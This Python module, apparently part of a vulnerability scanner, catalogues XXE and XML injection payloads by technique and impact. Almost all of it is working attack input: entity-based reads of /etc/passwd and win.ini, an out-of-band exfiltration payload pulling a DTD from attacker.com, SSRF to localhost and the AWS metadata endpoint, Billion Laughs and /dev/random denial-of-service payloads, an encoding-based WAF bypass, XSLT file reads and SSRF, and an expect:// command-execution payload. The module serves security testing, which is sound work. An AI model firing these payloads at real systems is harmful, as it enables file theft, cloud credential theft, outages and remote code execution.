"""
XML External Entity (XXE) Injection Payloads

Collection of payloads for detecting XXE and XML injection vulnerabilities.
"""

from dataclasses import dataclass
from typing import List


@dataclass
class XXEPayload:
    """XXE injection payload."""
    payload: str
    technique: str
    description: str
    waf_bypass: bool
    risk_indicator: str
    impact: str  # file_read|ssrf|dos|rce


def get_xxe_payloads() -> List[XXEPayload]:
    """Get all XXE injection payloads."""

    payloads = []

    # ==== BASIC FILE READING ====

    # Classic /etc/passwd read
    payloads.append(XXEPayload(
        payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>''',
        technique="external_entity",
        description="Read /etc/passwd via external entity",
        waf_bypass=False,
        risk_indicator="root:x:0:0",
        impact="file_read"
    ))

    # Windows file read
    payloads.append(XXEPayload(
        payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>''',
        technique="external_entity",
        description="Read Windows win.ini",
        waf_bypass=False,
        risk_indicator="[fonts]",
        impact="file_read"
    ))

    # ==== PARAMETER ENTITY ATTACKS ====

    # Out-of-band data exfiltration
    payloads.append(XXEPayload(
        payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<foo>&send;</foo>''',
        technique="parameter_entity",
        description="Out-of-band exfiltration",
        waf_bypass=False,
        risk_indicator="external_connection",
        impact="file_read"
    ))

    # ==== SSRF ATTACKS ====

    # HTTP request to localhost
    payloads.append(XXEPayload(
        payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://localhost:80/">
]>
<foo>&xxe;</foo>''',
        technique="ssrf",
        description="SSRF to localhost",
        waf_bypass=False,
        risk_indicator="localhost_response",
        impact="ssrf"
    ))

    # AWS metadata endpoint
    payloads.append(XXEPayload(
        payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>''',
        technique="ssrf",
        description="SSRF to AWS metadata",
        waf_bypass=False,
        risk_indicator="169.254.169.254",
        impact="ssrf"
    ))

    # ==== DENIAL OF SERVICE ====

    # Billion Laughs attack
    payloads.append(XXEPayload(
        payload='''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>''',
        technique="billion_laughs",
        description="Exponential entity expansion DoS",
        waf_bypass=False,
        risk_indicator="cpu_spike",
        impact="dos"
    ))

    # External DTD with recursion
    payloads.append(XXEPayload(
        payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///dev/random">
%xxe;
]>
<foo>test</foo>''',
        technique="resource_exhaustion",
        description="Read infinite file",
        waf_bypass=False,
        risk_indicator="timeout",
        impact="dos"
    ))

    # ==== ENCODING BYPASSES ====

    # UTF-16 encoding bypass
    payloads.append(XXEPayload(
        payload='''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>''',
        technique="encoding_bypass",
        description="UTF-16 encoding",
        waf_bypass=True,
        risk_indicator="root:x:0:0",
        impact="file_read"
    ))

    # ==== XSLT INJECTION ====

    # XSLT file read
    payloads.append(XXEPayload(
        payload='''<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('file:///etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>''',
        technique="xslt_injection",
        description="XSLT document() function",
        waf_bypass=False,
        risk_indicator="root:x:0:0",
        impact="file_read"
    ))

    # XSLT SSRF
    payloads.append(XXEPayload(
        payload='''<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>
</xsl:template>
</xsl:stylesheet>''',
        technique="xslt_injection",
        description="XSLT SSRF",
        waf_bypass=False,
        risk_indicator="169.254.169.254",
        impact="ssrf"
    ))

    # ==== PHP WRAPPER ATTACKS ====

    # PHP expect wrapper (RCE)
    payloads.append(XXEPayload(
        payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>''',
        technique="php_wrapper",
        description="PHP expect wrapper RCE",
        waf_bypass=False,
        risk_indicator="uid=",
        impact="rce"
    ))

    # ==== NESTED ENTITIES ====

    # Deeply nested entity
    payloads.append(XXEPayload(
        payload='''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe1 "test">
<!ENTITY xxe2 "&xxe1;&xxe1;">
<!ENTITY xxe3 "&xxe2;&xxe2;">
]>
<foo>&xxe3;</foo>''',
        technique="nested_entity",
        description="Nested entity expansion",
        waf_bypass=False,
        risk_indicator="entity_expansion",
        impact="dos"
    ))

    return payloads


def get_file_read_payloads() -> List[XXEPayload]:
    """Get payloads for file reading."""
    all_payloads = get_xxe_payloads()
    return [p for p in all_payloads if p.impact == 'file_read']


def get_ssrf_payloads() -> List[XXEPayload]:
    """Get SSRF payloads."""
    all_payloads = get_xxe_payloads()
    return [p for p in all_payloads if p.impact == 'ssrf']


def get_dos_payloads() -> List[XXEPayload]:
    """Get denial of service payloads."""
    all_payloads = get_xxe_payloads()
    return [p for p in all_payloads if p.impact == 'dos']
